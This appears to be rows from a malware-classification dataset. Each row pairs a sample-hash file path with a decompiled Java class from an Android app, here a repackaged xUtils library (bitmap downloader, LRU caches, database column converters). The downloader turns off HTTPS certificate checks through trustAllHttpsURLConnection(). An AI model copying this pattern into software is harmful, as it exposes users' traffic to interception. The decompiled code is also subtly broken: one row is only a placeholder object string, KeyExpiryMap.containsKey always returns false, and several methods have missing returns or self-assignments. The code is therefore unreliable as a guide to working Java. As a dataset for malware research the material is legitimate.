"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.bitmap.download\DefaultDownloader.code","public class DefaultDownloader extends Downloader {   @Override public long downloadToStream(  String str,  OutputStream outputStream,  BitmapUtils.BitmapLoadTask<?> bitmapLoadTask){     BufferedInputStream bufferedInputStream;     Throwable th;     long contentLength;     long j;     if (bitmapLoadTask == null || bitmapLoadTask.isCancelled() || bitmapLoadTask.getTargetContainer() == null) {       return -1L;     }     BufferedInputStream bufferedInputStream2=null;     OtherUtils.trustAllHttpsURLConnection();     long j2=0;     try {       try {         if (str.startsWith(""/"")) {           FileInputStream fileInputStream=new FileInputStream(str);           contentLength=fileInputStream.available();           BufferedInputStream bufferedInputStream3=new BufferedInputStream(fileInputStream);           try {             bufferedInputStream2=bufferedInputStream3;             j=System.currentTimeMillis() + getDefaultExpiry();           }  catch (          Throwable th2) {             th=th2;             bufferedInputStream=bufferedInputStream3;             try {               LogUtils.e(th.getMessage(),th);               IOUtils.closeQuietly(bufferedInputStream);               return -1L;             }  catch (            Throwable th3) {               th=th3;               bufferedInputStream2=bufferedInputStream;               IOUtils.closeQuietly(bufferedInputStream2);               throw th;             }           }         }  else         if (str.startsWith(""assets/"")) {           InputStream open=getContext().getAssets().open(str.substring(7,str.length()));           long available=open.available();           bufferedInputStream2=new BufferedInputStream(open);           contentLength=available;           j=Long.MAX_VALUE;         }  else {           URLConnection openConnection=new URL(str).openConnection();           openConnection.setConnectTimeout(getDefaultConnectTimeout());           openConnection.setReadTimeout(getDefaultReadTimeout());           BufferedInputStream bufferedInputStream4=new BufferedInputStream(openConnection.getInputStream());           try {             long expiration=openConnection.getExpiration();             if (expiration < System.currentTimeMillis()) {               expiration=getDefaultExpiry() + System.currentTimeMillis();             }             contentLength=openConnection.getContentLength();             bufferedInputStream2=bufferedInputStream4;             j=expiration;           }  catch (          Throwable th4) {             th=th4;             bufferedInputStream=bufferedInputStream4;             LogUtils.e(th.getMessage(),th);             IOUtils.closeQuietly(bufferedInputStream);             return -1L;           }         }         try {           if (bitmapLoadTask.isCancelled() || bitmapLoadTask.getTargetContainer() == null) {             IOUtils.closeQuietly(bufferedInputStream2);             return -1L;           }           byte[] bArr=new byte[4096];           BufferedOutputStream bufferedOutputStream=new BufferedOutputStream(outputStream);           while (true) {             int read=bufferedInputStream2.read(bArr);             if (read == -1) {               bufferedOutputStream.flush();               IOUtils.closeQuietly(bufferedInputStream2);               return j;             }             bufferedOutputStream.write(bArr,0,read);             j2+=read;             if (bitmapLoadTask.isCancelled() || bitmapLoadTask.getTargetContainer() == null) {               break;             }             bitmapLoadTask.updateProgress(contentLength,j2);           }           IOUtils.closeQuietly(bufferedInputStream2);           return -1L;         }  catch (        Throwable th5) {           bufferedInputStream=bufferedInputStream2;           th=th5;           LogUtils.e(th.getMessage(),th);           IOUtils.closeQuietly(bufferedInputStream);           return -1L;         }       }  catch (      Throwable th6) {         th=th6;       }     }  catch (    Throwable th7) {       bufferedInputStream=null;       th=th7;     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.bitmap.download\Downloader.code","public abstract class Downloader {   private Context context;   private int defaultConnectTimeout;   private long defaultExpiry;   private int defaultReadTimeout;   public abstract long downloadToStream(  String str,  OutputStream outputStream,  BitmapUtils.BitmapLoadTask<?> bitmapLoadTask);   public Context getContext(){     return this.context;   }   public int getDefaultConnectTimeout(){     return this.defaultConnectTimeout;   }   public long getDefaultExpiry(){     return this.defaultExpiry;   }   public int getDefaultReadTimeout(){     return this.defaultReadTimeout;   }   public void setContext(  Context context){     this.context=context;   }   public void setDefaultConnectTimeout(  int i){     this.defaultConnectTimeout=i;   }   public void setDefaultExpiry(  long j){     this.defaultExpiry=j;   }   public void setDefaultReadTimeout(  int i){     this.defaultReadTimeout=i;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.bitmap.factory\BitmapFactory.code","public interface BitmapFactory {   BitmapFactory cloneNew();   Bitmap createBitmap(  Bitmap bitmap); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.cache\Editor.code","public final class Editor {   private boolean committed;   private final Entry entry;   private boolean hasErrors;   private final boolean[] written; public class FaultHidingOutputStream extends FilterOutputStream {     private FaultHidingOutputStream(    OutputStream outputStream){       super(outputStream);     }     @Override public void close(){       try {         this.out.close();       }  catch (      Throwable th) {         Editor.this.hasErrors=true;       }     }     @Override public void flush(){       try {         this.out.flush();       }  catch (      Throwable th) {         Editor.this.hasErrors=true;       }     }     @Override public void write(    int i){       try {         this.out.write(i);       }  catch (      Throwable th) {         Editor.this.hasErrors=true;       }     }     @Override public void write(    byte[] bArr,    int i,    int i2){       try {         this.out.write(bArr,i,i2);         this.out.flush();       }  catch (      Throwable th) {         Editor.this.hasErrors=true;       }     }   }   private Editor(  Entry entry){     this.entry=entry;     this.written=entry.readable ? null : new boolean[LruDiskCache.this.valueCount];   }   public void abort(){     LruDiskCache.this.completeEdit(this,false);   }   public void abortUnlessCommitted(){     if (this.committed) {       return;     }     try {       abort();     }  catch (    Throwable th) {     }   }   public void commit(){     if (this.hasErrors) {       LruDiskCache.this.completeEdit(this,false);       LruDiskCache.this.removeByDiskKey(this.entry.diskKey);     }  else {       LruDiskCache.this.completeEdit(this,true);     }     this.committed=true;   }   public String getString(  int i){     InputStream newInputStream=newInputStream(i);     if (newInputStream != null) {       return LruDiskCache.inputStreamToString(newInputStream);     }     return null;   }   public InputStream newInputStream(  int i){ synchronized (LruDiskCache.this) {       if (this.entry.currentEditor != this) {         throw new IllegalStateException();       }       if (!this.entry.readable) {         return null;       }       try {         return new FileInputStream(this.entry.getCleanFile(i));       }  catch (      FileNotFoundException e) {         return null;       }     }   }   public OutputStream newOutputStream(  int i){     OutputStream outputStream;     FileOutputStream fileOutputStream; synchronized (LruDiskCache.this) {       if (this.entry.currentEditor != this) {         throw new IllegalStateException();       }       if (!this.entry.readable) {         this.written[i]=true;       }       File dirtyFile=this.entry.getDirtyFile(i);       try {         fileOutputStream=new FileOutputStream(dirtyFile);       }  catch (      FileNotFoundException e) {         LruDiskCache.this.directory.mkdirs();         try {           fileOutputStream=new FileOutputStream(dirtyFile);         }  catch (        FileNotFoundException e2) {           outputStream=LruDiskCache.NULL_OUTPUT_STREAM;         }       }       outputStream=new FaultHidingOutputStream(fileOutputStream);     }     return outputStream;   }   public void set(  int i,  String str){     OutputStreamWriter outputStreamWriter;     try {       outputStreamWriter=new OutputStreamWriter(newOutputStream(i),AsyncHttpResponseHandler.DEFAULT_CHARSET);     }  catch (    Throwable th) {       th=th;       outputStreamWriter=null;     }     try {       outputStreamWriter.write(str);       IOUtils.closeQuietly(outputStreamWriter);     }  catch (    Throwable th2) {       th=th2;       IOUtils.closeQuietly(outputStreamWriter);       throw th;     }   }   public void setEntryExpiryTimestamp(  long j){     this.entry.expiryTimestamp=j;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.cache\Entry.code","public final class Entry {   private Editor currentEditor;   private final String diskKey;   private long expiryTimestamp;   private final long[] lengths;   private boolean readable;   private long sequenceNumber;   private Entry(  String str){     this.expiryTimestamp=Long.MAX_VALUE;     this.diskKey=str;     this.lengths=new long[LruDiskCache.this.valueCount];   }   private IOException invalidLengths(  String[] strArr){     throw new IOException(""unexpected journal line: "" + Arrays.toString(strArr));   }   public void setLengths(  String[] strArr,  int i){     if (strArr.length - i != LruDiskCache.this.valueCount) {       throw invalidLengths(strArr);     }     for (int i2=0; i2 < LruDiskCache.this.valueCount; i2++) {       try {         this.lengths[i2]=Long.parseLong(strArr[i2 + i]);       }  catch (      NumberFormatException e) {         throw invalidLengths(strArr);       }     }   }   public File getCleanFile(  int i){     return new File(LruDiskCache.this.directory,this.diskKey + ""."" + i);   }   public File getDirtyFile(  int i){     return new File(LruDiskCache.this.directory,this.diskKey + ""."" + i+ "".tmp"");   }   public String getLengths(){     StringBuilder sb=new StringBuilder();     for (    long j : this.lengths) {       sb.append("" "").append(j);     }     return sb.toString();   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.cache\FaultHidingOutputStream.code","public class FaultHidingOutputStream extends FilterOutputStream {   private FaultHidingOutputStream(  OutputStream outputStream){     super(outputStream);   }   @Override public void close(){     try {       this.out.close();     }  catch (    Throwable th) {       Editor.this.hasErrors=true;     }   }   @Override public void flush(){     try {       this.out.flush();     }  catch (    Throwable th) {       Editor.this.hasErrors=true;     }   }   @Override public void write(  int i){     try {       this.out.write(i);     }  catch (    Throwable th) {       Editor.this.hasErrors=true;     }   }   @Override public void write(  byte[] bArr,  int i,  int i2){     try {       this.out.write(bArr,i,i2);       this.out.flush();     }  catch (    Throwable th) {       Editor.this.hasErrors=true;     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.cache\FileNameGenerator.code","public interface FileNameGenerator {   String generate(  String str); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.cache\KeyExpiryMap.code","public class KeyExpiryMap<K,V> extends ConcurrentHashMap<K,Long> {   private static final int DEFAULT_CONCURRENCY_LEVEL=16;   private static final long serialVersionUID=1;   public KeyExpiryMap(){   }   public KeyExpiryMap(  int i){     super(i);   }   public KeyExpiryMap(  int i,  float f){     super(i,f,16);   }   public KeyExpiryMap(  int i,  float f,  int i2){     super(i,f,i2);   }   @Override public synchronized void clear(){     super.clear();   }   @Override public synchronized boolean containsKey(  Object obj){     boolean z;     if (super.containsKey(obj)) {       Long l=(Long)super.get(obj);       if (l == null || System.currentTimeMillis() >= l.longValue()) {         remove(obj);       }  else {         z=true;       }     }     z=false;     return z;   }   @Override public synchronized Long get(  Object obj){     return containsKey(obj) ? (Long)super.get(obj) : null;   }   public synchronized Long put(  K k,  Long l){     if (containsKey(k)) {       remove((Object)k);     }     return (Long)super.put((KeyExpiryMap<K,V>)k,(K)l);   }   @Override public Object put(  Object obj,  Object obj2){     return put((KeyExpiryMap<K,V>)obj,(Long)obj2);   }   @Override public synchronized Long remove(  Object obj){     return (Long)super.remove(obj);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.cache\LruDiskCache.code","!org.eclipse.jdt.core.dom.TypeDeclaration@3c559953"
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.cache\LruMemoryCache.code","public class LruMemoryCache<K,V> {   private int createCount;   private int evictionCount;   private int hitCount;   private KeyExpiryMap<K,Long> keyExpiryMap;   private final LinkedHashMap<K,V> map;   private int maxSize;   private int missCount;   private int putCount;   private int size;   public LruMemoryCache(  int i){     if (i <= 0) {       throw new IllegalArgumentException(""maxSize <= 0"");     }     this.maxSize=i;     this.map=new LinkedHashMap<>(0,0.75f,true);     this.keyExpiryMap=new KeyExpiryMap<>(0,0.75f);   }   private int safeSizeOf(  K k,  V v){     int sizeOf=sizeOf(k,v);     if (sizeOf <= 0) {       this.size=0;       for (      Map.Entry<K,V> entry : this.map.entrySet()) {         this.size=sizeOf(entry.getKey(),entry.getValue()) + this.size;       }     }     return sizeOf;   }   private void trimToSize(  int i){     K key;     V value;     while (true) { synchronized (this) {         if (this.size <= i || this.map.isEmpty()) {           break;         }         Map.Entry<K,V> next=this.map.entrySet().iterator().next();         key=next.getKey();         value=next.getValue();         this.map.remove(key);         this.keyExpiryMap.remove((Object)key);         this.size-=safeSizeOf(key,value);         this.evictionCount++;       }       entryRemoved(true,key,value,null);     }   }   public final boolean containsKey(  K k){     return this.map.containsKey(k);   }   protected V create(  K k){     return null;   }   public final synchronized int createCount(){     return this.createCount;   }   protected void entryRemoved(  boolean z,  K k,  V v,  V v2){   }   public final void evictAll(){     trimToSize(-1);     this.keyExpiryMap.clear();   }   public final synchronized int evictionCount(){     return this.evictionCount;   }   public final V get(  K k){     V v;     if (k == null) {       throw new NullPointerException(""key == null"");     } synchronized (this) {       if (!this.keyExpiryMap.containsKey(k)) {         remove(k);         return null;       }       V v2=this.map.get(k);       if (v2 != null) {         this.hitCount++;         return v2;       }       this.missCount++;       V create=create(k);       if (create == null) {         return null;       } synchronized (this) {         this.createCount++;         v=(V)this.map.put(k,create);         if (v != null) {           this.map.put(k,v);         }  else {           this.size+=safeSizeOf(k,create);         }       }       if (v != null) {         entryRemoved(false,k,create,v);         return v;       }       trimToSize(this.maxSize);       return create;     }   }   public final synchronized int hitCount(){     return this.hitCount;   }   public final synchronized int maxSize(){     return this.maxSize;   }   public final synchronized int missCount(){     return this.missCount;   }   public final V put(  K k,  V v){     return put(k,v,Long.MAX_VALUE);   }   public final V put(  K k,  V v,  long j){     V put;     if (k == null || v == null) {       throw new NullPointerException(""key == null || value == null"");     } synchronized (this) {       this.putCount++;       this.size+=safeSizeOf(k,v);       put=this.map.put(k,v);       this.keyExpiryMap.put((KeyExpiryMap<K,Long>)k,Long.valueOf(j));       if (put != null) {         this.size-=safeSizeOf(k,put);       }     }     if (put != null) {       entryRemoved(false,k,put,v);     }     trimToSize(this.maxSize);     return put;   }   public final synchronized int putCount(){     return this.putCount;   }   public final V remove(  K k){     V remove;     if (k == null) {       throw new NullPointerException(""key == null"");     } synchronized (this) {       remove=this.map.remove(k);       this.keyExpiryMap.remove((Object)k);       if (remove != null) {         this.size-=safeSizeOf(k,remove);       }     }     if (remove != null) {       entryRemoved(false,k,remove,null);     }     return remove;   }   public void setMaxSize(  int i){     this.maxSize=i;     trimToSize(i);   }   public final synchronized int size(){     return this.size;   }   protected int sizeOf(  K k,  V v){     return 1;   }   public final synchronized Map<K,V> snapshot(){     return new LinkedHashMap(this.map);   }   public final synchronized String toString(){     String format; synchronized (this) {       int i=this.hitCount + this.missCount;       format=String.format(""LruMemoryCache[maxSize=%d,hits=%d,misses=%d,hitRate=%d%%]"",Integer.valueOf(this.maxSize),Integer.valueOf(this.hitCount),Integer.valueOf(this.missCount),Integer.valueOf(i != 0 ? (this.hitCount * 100) / i : 0));     }     return format;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.cache\MD5FileNameGenerator.code","public class MD5FileNameGenerator implements FileNameGenerator {   private String bytesToHexString(  byte[] bArr){     StringBuilder sb=new StringBuilder();     for (    byte b : bArr) {       String hexString=Integer.toHexString(b & 255);       if (hexString.length() == 1) {         sb.append('0');       }       sb.append(hexString);     }     return sb.toString();   }   @Override public String generate(  String str){     try {       MessageDigest messageDigest=MessageDigest.getInstance(""MD5"");       messageDigest.update(str.getBytes());       return bytesToHexString(messageDigest.digest());     }  catch (    NoSuchAlgorithmException e) {       return String.valueOf(str.hashCode());     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.cache\Snapshot.code","public final class Snapshot implements Closeable {   private final String diskKey;   private final FileInputStream[] ins;   private final long[] lengths;   private final long sequenceNumber;   private Snapshot(  String str,  long j,  FileInputStream[] fileInputStreamArr,  long[] jArr){     this.diskKey=str;     this.sequenceNumber=j;     this.ins=fileInputStreamArr;     this.lengths=jArr;   }   @Override public void close(){     for (    FileInputStream fileInputStream : this.ins) {       IOUtils.closeQuietly(fileInputStream);     }   }   public Editor edit(){     return LruDiskCache.this.editByDiskKey(this.diskKey,this.sequenceNumber);   }   public FileInputStream getInputStream(  int i){     return this.ins[i];   }   public long getLength(  int i){     return this.lengths[i];   }   public String getString(  int i){     return LruDiskCache.inputStreamToString(getInputStream(i));   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.cache\StrictLineReader.code","public class StrictLineReader implements Closeable {   private static final byte CR=13;   private static final byte LF=10;   private byte[] buf;   private final Charset charset;   private int end;   private final InputStream in;   private int pos;   public StrictLineReader(  LruDiskCache lruDiskCache,  InputStream inputStream){     this(inputStream,8192);   }   public StrictLineReader(  InputStream inputStream,  int i){     this.charset=Charset.forName(""US-ASCII"");     if (inputStream == null) {       throw new NullPointerException();     }     if (i < 0) {       throw new IllegalArgumentException(""capacity <= 0"");     }     this.in=inputStream;     this.buf=new byte[i];   }   private void fillBuf(){     int read=this.in.read(this.buf,0,this.buf.length);     if (read == -1) {       throw new EOFException();     }     this.pos=0;     this.end=read;   }   @Override public void close(){ synchronized (this.in) {       if (this.buf != null) {         this.buf=null;         this.in.close();       }     }   }   public String readLine(){     int i;     String byteArrayOutputStream; synchronized (this.in) {       if (this.buf == null) {         throw new IOException(""LineReader is closed"");       }       if (this.pos >= this.end) {         fillBuf();       }       int i2=this.pos;       while (true) {         if (i2 == this.end) {           ByteArrayOutputStream byteArrayOutputStream2=new ByteArrayOutputStream((this.end - this.pos) + 80){             @Override public String toString(){               try {                 return new String(this.buf,0,(this.count <= 0 || this.buf[this.count + (-1)] != 13) ? this.count : this.count - 1,StrictLineReader.this.charset.name());               }  catch (              UnsupportedEncodingException e) {                 throw new AssertionError(e);               }             }           } ;           loop1:           while (true) {             byteArrayOutputStream2.write(this.buf,this.pos,this.end - this.pos);             this.end=-1;             fillBuf();             i=this.pos;             while (i != this.end) {               if (this.buf[i] == 10) {                 break loop1;               }               i++;             }           }           if (i != this.pos) {             byteArrayOutputStream2.write(this.buf,this.pos,i - this.pos);           }           byteArrayOutputStream2.flush();           this.pos=i + 1;           byteArrayOutputStream=byteArrayOutputStream2.toString();         }  else         if (this.buf[i2] == 10) {           byteArrayOutputStream=new String(this.buf,this.pos,((i2 == this.pos || this.buf[i2 + (-1)] != 13) ? i2 : i2 - 1) - this.pos,this.charset.name());           this.pos=i2 + 1;         }  else {           i2++;         }       }       return byteArrayOutputStream;     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.db.converter\BooleanColumnConverter.code","public class BooleanColumnConverter implements ColumnConverter<Boolean> {   @Override public Object fieldValue2ColumnValue(  Boolean bool){     if (bool == null) {       return null;     }     return Integer.valueOf(bool.booleanValue() ? 1 : 0);   }   @Override public ColumnDbType getColumnDbType(){     return ColumnDbType.INTEGER;   }   @Override public Boolean getFieldValue(  Cursor cursor,  int i){     if (cursor.isNull(i)) {       return null;     }     return Boolean.valueOf(cursor.getInt(i) == 1);   }   @Override public Boolean getFieldValue(  String str){     if (TextUtils.isEmpty(str)) {       return null;     }     return Boolean.valueOf(str.length() == 1 ? ""1"".equals(str) : Boolean.valueOf(str).booleanValue());   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.db.converter\ByteArrayColumnConverter.code","public class ByteArrayColumnConverter implements ColumnConverter<byte[]> {   @Override public Object fieldValue2ColumnValue(  byte[] bArr){     return bArr;   }   @Override public ColumnDbType getColumnDbType(){     return ColumnDbType.BLOB;   }   @Override public byte[] getFieldValue(  Cursor cursor,  int i){     if (cursor.isNull(i)) {       return null;     }     return cursor.getBlob(i);   }   @Override public byte[] getFieldValue(  String str){     return null;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.db.converter\ByteColumnConverter.code","public class ByteColumnConverter implements ColumnConverter<Byte> {   @Override public Object fieldValue2ColumnValue(  Byte b){     return b;   }   @Override public ColumnDbType getColumnDbType(){     return ColumnDbType.INTEGER;   }   @Override public Byte getFieldValue(  Cursor cursor,  int i){     if (cursor.isNull(i)) {       return null;     }     return Byte.valueOf((byte)cursor.getInt(i));   }   @Override public Byte getFieldValue(  String str){     if (TextUtils.isEmpty(str)) {       return null;     }     return Byte.valueOf(str);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.db.converter\CharColumnConverter.code","public class CharColumnConverter implements ColumnConverter<Character> {   @Override public Object fieldValue2ColumnValue(  Character ch){     if (ch == null) {       return null;     }     return Integer.valueOf(ch.charValue());   }   @Override public ColumnDbType getColumnDbType(){     return ColumnDbType.INTEGER;   }   @Override public Character getFieldValue(  Cursor cursor,  int i){     if (cursor.isNull(i)) {       return null;     }     return Character.valueOf((char)cursor.getInt(i));   }   @Override public Character getFieldValue(  String str){     if (TextUtils.isEmpty(str)) {       return null;     }     return Character.valueOf(str.charAt(0));   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.db.converter\ColumnConverter.code","public interface ColumnConverter<T> {   Object fieldValue2ColumnValue(  T t);   ColumnDbType getColumnDbType();   T getFieldValue(  Cursor cursor,  int i);   T getFieldValue(  String str); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.db.converter\ColumnConverterFactory.code","public class ColumnConverterFactory {   private static final ConcurrentHashMap<String,ColumnConverter> columnType_columnConverter_map=new ConcurrentHashMap<>(); static {     BooleanColumnConverter booleanColumnConverter=new BooleanColumnConverter();     columnType_columnConverter_map.put(Boolean.TYPE.getName(),booleanColumnConverter);     columnType_columnConverter_map.put(Boolean.class.getName(),booleanColumnConverter);     columnType_columnConverter_map.put(byte[].class.getName(),new ByteArrayColumnConverter());     ByteColumnConverter byteColumnConverter=new ByteColumnConverter();     columnType_columnConverter_map.put(Byte.TYPE.getName(),byteColumnConverter);     columnType_columnConverter_map.put(Byte.class.getName(),byteColumnConverter);     CharColumnConverter charColumnConverter=new CharColumnConverter();     columnType_columnConverter_map.put(Character.TYPE.getName(),charColumnConverter);     columnType_columnConverter_map.put(Character.class.getName(),charColumnConverter);     columnType_columnConverter_map.put(Date.class.getName(),new DateColumnConverter());     DoubleColumnConverter doubleColumnConverter=new DoubleColumnConverter();     columnType_columnConverter_map.put(Double.TYPE.getName(),doubleColumnConverter);     columnType_columnConverter_map.put(Double.class.getName(),doubleColumnConverter);     FloatColumnConverter floatColumnConverter=new FloatColumnConverter();     columnType_columnConverter_map.put(Float.TYPE.getName(),floatColumnConverter);     columnType_columnConverter_map.put(Float.class.getName(),floatColumnConverter);     IntegerColumnConverter integerColumnConverter=new IntegerColumnConverter();     columnType_columnConverter_map.put(Integer.TYPE.getName(),integerColumnConverter);     columnType_columnConverter_map.put(Integer.class.getName(),integerColumnConverter);     LongColumnConverter longColumnConverter=new LongColumnConverter();     columnType_columnConverter_map.put(Long.TYPE.getName(),longColumnConverter);     columnType_columnConverter_map.put(Long.class.getName(),longColumnConverter);     ShortColumnConverter shortColumnConverter=new ShortColumnConverter();     columnType_columnConverter_map.put(Short.TYPE.getName(),shortColumnConverter);     columnType_columnConverter_map.put(Short.class.getName(),shortColumnConverter);     columnType_columnConverter_map.put(java.sql.Date.class.getName(),new SqlDateColumnConverter());     columnType_columnConverter_map.put(String.class.getName(),new StringColumnConverter());   }   private ColumnConverterFactory(){   }   public static ColumnConverter getColumnConverter(  Class cls){     if (columnType_columnConverter_map.containsKey(cls.getName())) {       return columnType_columnConverter_map.get(cls.getName());     }     if (ColumnConverter.class.isAssignableFrom(cls)) {       try {         ColumnConverter columnConverter=(ColumnConverter)cls.newInstance();         if (columnConverter == null) {           return columnConverter;         }         columnType_columnConverter_map.put(cls.getName(),columnConverter);         return columnConverter;       }  catch (      Throwable th) {       }     }     return null;   }   public static ColumnDbType getDbColumnType(  Class cls){     ColumnConverter columnConverter=getColumnConverter(cls);     return columnConverter != null ? columnConverter.getColumnDbType() : ColumnDbType.TEXT;   }   public static boolean isSupportColumnConverter(  Class cls){     if (columnType_columnConverter_map.containsKey(cls.getName())) {       return true;     }     if (ColumnConverter.class.isAssignableFrom(cls)) {       try {         ColumnConverter columnConverter=(ColumnConverter)cls.newInstance();         if (columnConverter != null) {           columnType_columnConverter_map.put(cls.getName(),columnConverter);         }         return columnConverter == null;       }  catch (      Throwable th) {       }     }     return false;   }   public static void registerColumnConverter(  Class cls,  ColumnConverter columnConverter){     columnType_columnConverter_map.put(cls.getName(),columnConverter);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.db.converter\DateColumnConverter.code","public class DateColumnConverter implements ColumnConverter<Date> {   @Override public Object fieldValue2ColumnValue(  Date date){     if (date == null) {       return null;     }     return Long.valueOf(date.getTime());   }   @Override public ColumnDbType getColumnDbType(){     return ColumnDbType.INTEGER;   }   @Override public Date getFieldValue(  Cursor cursor,  int i){     if (cursor.isNull(i)) {       return null;     }     return new Date(cursor.getLong(i));   }   @Override public Date getFieldValue(  String str){     if (TextUtils.isEmpty(str)) {       return null;     }     return new Date(Long.valueOf(str).longValue());   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.db.converter\DoubleColumnConverter.code","public class DoubleColumnConverter implements ColumnConverter<Double> {   @Override public Object fieldValue2ColumnValue(  Double d){     return d;   }   @Override public ColumnDbType getColumnDbType(){     return ColumnDbType.REAL;   }   @Override public Double getFieldValue(  Cursor cursor,  int i){     if (cursor.isNull(i)) {       return null;     }     return Double.valueOf(cursor.getDouble(i));   }   @Override public Double getFieldValue(  String str){     if (TextUtils.isEmpty(str)) {       return null;     }     return Double.valueOf(str);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.db.converter\FloatColumnConverter.code","public class FloatColumnConverter implements ColumnConverter<Float> {   @Override public Object fieldValue2ColumnValue(  Float f){     return f;   }   @Override public ColumnDbType getColumnDbType(){     return ColumnDbType.REAL;   }   @Override public Float getFieldValue(  Cursor cursor,  int i){     if (cursor.isNull(i)) {       return null;     }     return Float.valueOf(cursor.getFloat(i));   }   @Override public Float getFieldValue(  String str){     if (TextUtils.isEmpty(str)) {       return null;     }     return Float.valueOf(str);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.db.converter\IntegerColumnConverter.code","public class IntegerColumnConverter implements ColumnConverter<Integer> {   @Override public Object fieldValue2ColumnValue(  Integer num){     return num;   }   @Override public ColumnDbType getColumnDbType(){     return ColumnDbType.INTEGER;   }   @Override public Integer getFieldValue(  Cursor cursor,  int i){     if (cursor.isNull(i)) {       return null;     }     return Integer.valueOf(cursor.getInt(i));   }   @Override public Integer getFieldValue(  String str){     if (TextUtils.isEmpty(str)) {       return null;     }     return Integer.valueOf(str);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.db.converter\LongColumnConverter.code","public class LongColumnConverter implements ColumnConverter<Long> {   @Override public Object fieldValue2ColumnValue(  Long l){     return l;   }   @Override public ColumnDbType getColumnDbType(){     return ColumnDbType.INTEGER;   }   @Override public Long getFieldValue(  Cursor cursor,  int i){     if (cursor.isNull(i)) {       return null;     }     return Long.valueOf(cursor.getLong(i));   }   @Override public Long getFieldValue(  String str){     if (TextUtils.isEmpty(str)) {       return null;     }     return Long.valueOf(str);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.db.converter\ShortColumnConverter.code","public class ShortColumnConverter implements ColumnConverter<Short> {   @Override public Object fieldValue2ColumnValue(  Short sh){     return sh;   }   @Override public ColumnDbType getColumnDbType(){     return ColumnDbType.INTEGER;   }   @Override public Short getFieldValue(  Cursor cursor,  int i){     if (cursor.isNull(i)) {       return null;     }     return Short.valueOf(cursor.getShort(i));   }   @Override public Short getFieldValue(  String str){     if (TextUtils.isEmpty(str)) {       return null;     }     return Short.valueOf(str);   } } "
